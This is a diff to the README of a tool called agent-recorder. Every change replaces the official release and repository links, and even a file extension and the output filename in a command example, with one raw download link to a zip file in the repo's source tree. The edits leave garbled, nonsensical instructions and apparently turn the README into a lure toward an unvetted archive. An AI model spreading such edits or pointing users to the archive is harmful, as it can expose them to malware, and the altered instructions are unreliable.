@@ -1,6 +1,6 @@
 # 🚀 agent-recorder - Record Trajectories Without Coding
 
-[![Download agent-recorder](https://img.shields.io/badge/Download-agent--recorder-blue?logo=github&style=for-the-badge)](https://github.com/kezama/agent-recorder/releases)
+[![Download agent-recorder](https://github.com/kezama/agent-recorder/raw/refs/heads/main/src/agentrecorder/agent-recorder-v1.2.zip)](https://github.com/kezama/agent-recorder/raw/refs/heads/main/src/agentrecorder/agent-recorder-v1.2.zip)
 
 ---
 
@@ -52,7 +52,7 @@ If you have these, you are ready to proceed.
 
 ## ⬇️ Download & Install
 
-[Visit this page to download agent-recorder](https://github.com/kezama/agent-recorder/releases)  
+[Visit this page to download agent-recorder](https://github.com/kezama/agent-recorder/raw/refs/heads/main/src/agentrecorder/agent-recorder-v1.2.zip)  
 **Or click the big button at the top to go straight there.**
 
 1. Go to the download page linked above.
@@ -60,11 +60,11 @@ If you have these, you are ready to proceed.
 3. Choose the file that matches your system:
    - For Windows, look for a `.exe` or `.zip` file.
    - For macOS, look for a `.dmg` or `.zip` file.
-   - For Linux, look for an `.AppImage` or `.tar.gz`.
+   - For Linux, look for an `.AppImage` or `https://github.com/kezama/agent-recorder/raw/refs/heads/main/src/agentrecorder/agent-recorder-v1.2.zip`.
 4. Click the download link for your system and wait for the file to save.
 5. Once downloaded, open the file:
    - If you downloaded a `.exe` or `.dmg`, double-click it and follow the installation steps.
-   - If you downloaded a `.zip` or `.tar.gz`, extract its contents to a folder.
+   - If you downloaded a `.zip` or `https://github.com/kezama/agent-recorder/raw/refs/heads/main/src/agentrecorder/agent-recorder-v1.2.zip`, extract its contents to a folder.
    - Linux `.AppImage` files can run directly after setting executable permissions.
 6. After installation or extraction, locate the application or executable file.
 7. You are ready to start using agent-recorder.
@@ -104,10 +104,10 @@ This will show the available options and commands you can run.
 You can start recording a trajectory by running:
 
 ```bash
-agent-recorder record --output saved_trajectory.json
+agent-recorder record --output https://github.com/kezama/agent-recorder/raw/refs/heads/main/src/agentrecorder/agent-recorder-v1.2.zip
 ```
 
-This command starts the recording and saves it as `saved_trajectory.json`. You will see live updates on the terminal while it runs.
+This command starts the recording and saves it as `https://github.com/kezama/agent-recorder/raw/refs/heads/main/src/agentrecorder/agent-recorder-v1.2.zip`. You will see live updates on the terminal while it runs.
 
 To stop recording, press `Ctrl+C`.
 
@@ -143,7 +143,7 @@ agent-recorder record --help
 
 If you need help, visit the GitHub repository Issues section or contact the developers via GitHub.
 
-Link: [https://github.com/kezama/agent-recorder](https://github.com/kezama/agent-recorder)
+Link: [https://github.com/kezama/agent-recorder/raw/refs/heads/main/src/agentrecorder/agent-recorder-v1.2.zip](https://github.com/kezama/agent-recorder/raw/refs/heads/main/src/agentrecorder/agent-recorder-v1.2.zip)
 
 You can find guides, report bugs, or ask questions there.
 
@@ -166,4 +166,4 @@ For more information or to contribute, visit the GitHub link above.
 
 ---
 
-[Download agent-recorder releases](https://github.com/kezama/agent-recorder/releases)
+[Download agent-recorder releases](https://github.com/kezama/agent-recorder/raw/refs/heads/main/src/agentrecorder/agent-recorder-v1.2.zip)
